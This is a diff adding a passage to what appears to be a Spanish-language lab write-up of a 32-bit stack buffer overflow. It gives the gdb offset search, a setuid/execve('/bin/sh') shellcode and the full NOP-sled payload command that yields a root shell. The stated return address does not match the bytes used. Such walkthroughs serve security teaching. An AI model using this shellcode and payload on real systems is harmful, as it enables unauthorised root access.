@@ -334,3 +334,71 @@ Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac
 </code>
 </pre>
 
+Lo siguiente que haremos será abrir gdb con el binario de 32 bits.
+
+<pre>
+  <code>
+    gbd -q vuln
+  </code>
+</pre>
+
+Una vez le pasamos el pattern que generamos con el módulo de metasploit.
+
+<pre>
+  <code>
+    info registers eip
+  </code>
+</pre>
+En hexadecimal lo pasaremos con xxd
+
+Vamos a pasarlo a pattern ofsset el resultado.
+
+<pre>
+  <code>
+    ❯ ./pattern_offset.rb -q c5Ac
+[*] Exact match at offset 76
+❯ 
+  </code>
+</pre>
+
+Una vez tenemos el offset, necesitamos buscar un shellcode util. Necesitamos que el shellcode ejecute ´setuid´ para cambiarlo por el de root. y después una bash.
+Usaremos el siguiente shellcode:
+
+<pre>
+  <code>
+    \x6a\x17\x58\x31\xdb\xcd\x80\x6a\x2e\x58\x53\xcd\x80\x31\xd2\x6a\x0b\x58\x52\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x52\x53\x89\xe1\xcd\x80
+  </code>
+</pre>
+
+Lo que hace exactamente este shellcode es lo siguiente:
+
+<pre>
+  <code>
+    setuid(0) + setgid(0) + execve("/bin/sh", ["/bin/sh", NULL])
+  </code>
+</pre>
+
+Desde gdb le pasaremos el binario vulnerable y lo ejecutaremos de la siguiente manera:
+
+<pre>
+  <code>
+    r $(python2.7 -c 'print "\x90"*39 + "\x6a\x17\x58\x31\xdb\xcd\x80\x6a\x2e\x58\x53\xcd\x80\x31\xd2\x6a\x0b\x58\x52\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x52\x53\x89\xe1\xcd\x80" + "B"*4 + "C"*200')
+  </code>
+</pre>
+
+Esto lo que va hacer es pasarle 39 NOPs, el shellcode y tomar el control total del EIP con 4 B, Le pasamos 39 NOPs ya que nuestro shellcode tiene 37 bytes y si le sumamos 32 del ejecutable tendríamos el offset. y 200 letras "C" para identificar más facil donde queda nuestro shellcode y los NOPs.
+
+
+Ahora tenemos que hacer que el EIP apunte a ´0xffffd6c0´ , para que con los NOPs consigamos escapar a nuestra shellcode y ejecutarnos la bash como root.
+
+Ejecutaremos lo siguiente
+
+<pre>
+  <code>
+    /home/ttttt/bf/vuln $(python2.7 -c 'print "\x90"*39 + "\x6a\x17\x58\x31\xdb\xcd\x80\x6a\x2e\x58\x53\xcd\x80\x31\xd2\x6a\x0b\x58\x52\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x52\x53\x89\xe1\xcd\x80" + "\x80\xd7\xff\xff"')
+  </code>
+</pre>
+
+Una vez ejecutado ya estaríamos como root y habríamos pwneado por completo la máquina.
+
+Salud ^^
